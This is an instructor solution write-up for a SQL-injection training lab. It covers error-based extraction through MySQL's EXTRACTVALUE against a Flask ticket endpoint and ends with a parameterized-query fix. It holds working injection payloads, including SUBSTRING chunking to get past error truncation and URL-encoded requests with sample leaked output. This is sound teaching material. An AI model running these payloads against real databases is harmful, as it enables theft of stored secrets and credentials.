# Solution — sqli-error-based-extractvalue

<!-- Instructor/authoring reference. Students should try the hints first. -->

> **Architecture note (simplification).** Like the other Python SQLi labs, this
> implementation omits any nginx reverse proxy: gunicorn binds `0.0.0.0:8080`
> directly and the container publishes that port on `127.0.0.1`. A reverse proxy
> is a transport detail — it would forward the same `assignee` query parameter to
> the same Flask handler — so removing it changes nothing about the vulnerability,
> the payload, or the fix, while keeping the image small and the hardening posture
> identical to its siblings. The vulnerable stack is app + a hardened non-root
> MySQL 8.4.

## What tipped you off

`/tickets?assignee=X` changes the list of tickets, so `X` clearly reaches SQL.
Submitting a single quote (`?assignee=alice'`) returns a raw
`(1064, "You have an error in your SQL syntax ... near '''")` inside the banner
instead of a clean "no tickets" page. A server that leaks its SQL error text is
almost always concatenating your input into the statement — and here that error
channel is not just a hint, it is the **exfiltration channel itself**.

## The class of bug

SQL injection (**CWE-89**, OWASP **A03:2021 – Injection**) in a **single-quoted
string context**, exploited as an **error-based** read. The page never has to
render your stolen data as a table row: you provoke a database _error_ whose
message contains a value you chose, and the app helpfully prints that message.
The verbose error channel (**CWE-209**) is therefore a first-class part of the
vulnerability, not merely an aid.

## Vulnerability

`src/app.py`, `/tickets`:

```python
sql = (
    "SELECT id, subject, status FROM tickets "
    "WHERE assignee='" + assignee + "'"
)
```

`assignee` comes straight from the query string with no quoting, escaping,
parameterization, or allowlisting. The `except` branch then echoes `str(exc)` —
the raw driver error — into the response (HTML-escaped only to avoid an
_accidental_ reflected-XSS side quest; the error text itself is untouched).

## Why the developer wrote it this way

Concatenating a filter value into a `WHERE` clause is the most "obvious" way to
build a query when you have never been bitten by injection. It reads like a
sentence, it is trivial to `print()` and debug, and it works perfectly for every
value the developer actually tested (`alice`, `bob`, `carol`). Echoing the
database error back to the browser is the same instinct one step later: it made
local debugging fast and gave support staff something to screenshot, and nobody
circled back to hide it before shipping.

## Why it exists

The database has no way to tell your _data_ apart from your _code_ once both
arrive as one concatenated string. A bound parameter would ship `assignee` to the
server as a value that can only ever be compared against the `assignee` column;
concatenation instead lets `'` end the literal and everything after it be parsed
as SQL — including a call to an error-raising function. The reflected error
compounds it: MySQL's `EXTRACTVALUE()` prints the malformed XPath string it was
given, so anything you smuggle into that string is handed straight back to you.

## The mechanical exploit

### 1. Confirm injection

`?assignee=alice'` → a `1064` syntax error in the banner. You are inside a
single-quoted string literal, closed by a trailing `'`.

### 2. Turn errors into an oracle with EXTRACTVALUE

`EXTRACTVALUE(xml_frag, xpath_expr)` evaluates its second argument as an XPath
expression. If that string is **not valid XPath**, MySQL raises:

```
XPATH syntax error: '<the offending string>'
```

Prefix any value with a character that is illegal at the start of an XPath step —
`:` (`0x3a`) is the classic choice — and MySQL echoes your value verbatim inside
the error. Wrap a subquery in `CONCAT(0x3a, (SELECT ...))` and you have a
read primitive:

```
alice' AND extractvalue(1,concat(0x3a,(select api_key from secrets limit 1)))-- -
```

The `'` closes the `alice` literal; `AND extractvalue(...)` is evaluated for the
matching rows and throws; `-- -` comments out the trailing quote (mind the space
after `--`). The resulting query is, in effect:

```sql
SELECT id, subject, status FROM tickets
WHERE assignee='alice' AND extractvalue(1,concat(0x3a,(select api_key from secrets limit 1)))-- -'
```

### 3. Beat the 32-character truncation

MySQL truncates the XPATH error string at **32 characters**. With the leading
`:` that leaves **31 characters** of your value — but `secrets.api_key` is a
36-character UUID. So read it in two `SUBSTRING` slices and stitch them together:

```
-- chunk 1 (characters 1..31)
alice' AND extractvalue(1,concat(0x3a,(select substring(api_key,1,31) from secrets limit 1)))-- -

-- chunk 2 (characters 32..end)
alice' AND extractvalue(1,concat(0x3a,(select substring(api_key,32) from secrets limit 1)))-- -
```

Each request yields `XPATH syntax error: ':<chunk>'`. Strip the `:` delimiter
from each, concatenate `chunk1 + chunk2`, and you have the full UUID.

## Exploit walkthrough

Two URL-encoded GETs, then read the value after the `:` in each banner:

```
GET /tickets?assignee=alice%27%20AND%20extractvalue(1%2Cconcat(0x3a%2C(select%20substring(api_key%2C1%2C31)%20from%20secrets%20limit%201)))--%20-
-> ... XPATH syntax error: ':d3b07384-d113-4ec8-a1a6-1234567' ...

GET /tickets?assignee=alice%27%20AND%20extractvalue(1%2Cconcat(0x3a%2C(select%20substring(api_key%2C32)%20from%20secrets%20limit%201)))--%20-
-> ... XPATH syntax error: ':890ab' ...
```

Reassemble → `d3b07384-d113-4ec8-a1a6-1234567890ab`, then trade it for the flag:

```
POST /solve   Content-Type: application/json
{"key": "d3b07384-d113-4ec8-a1a6-1234567890ab"}
-> 200  FLAG{...}
```

`tests/exploit.py` performs exactly this with the standard library only, extracts
the key dynamically (it is random per container), reassembles the two chunks, and
asserts the recovered flag equals the HMAC-derived expected value. `UPDATEXML(1,
concat(0x3a,(select ...)),1)` produces the same "XPATH syntax error" leak and is
a good drop-in alternative to practise; a `SELECT ... FROM information_schema`
subquery lets you discover the `secrets` table and column names without prior
knowledge.

## Fix

Never concatenate input into SQL, and never reflect raw driver errors:

```python
sql = "SELECT id, subject, status FROM tickets WHERE assignee=%s"
try:
    with conn.cursor() as cur:
        cur.execute(sql, (assignee,))   # assignee is a value, never code
        rows = cur.fetchall()
except Exception:
    app.logger.exception("ticket query failed")             # log server-side
    return Response("The queue is temporarily unavailable.", status=500)  # generic
```

With a bound parameter, `alice' AND extractvalue(...)` is compared literally
against the `assignee` column and matches nothing — the `'` and the function call
never reach the parser as code. Returning a generic error message removes the
CWE-209 error-based oracle entirely, so even a residual injection elsewhere loses
its readout channel. If you must sort or filter on identifiers, map user input to
a fixed server-side allowlist rather than interpolating it.
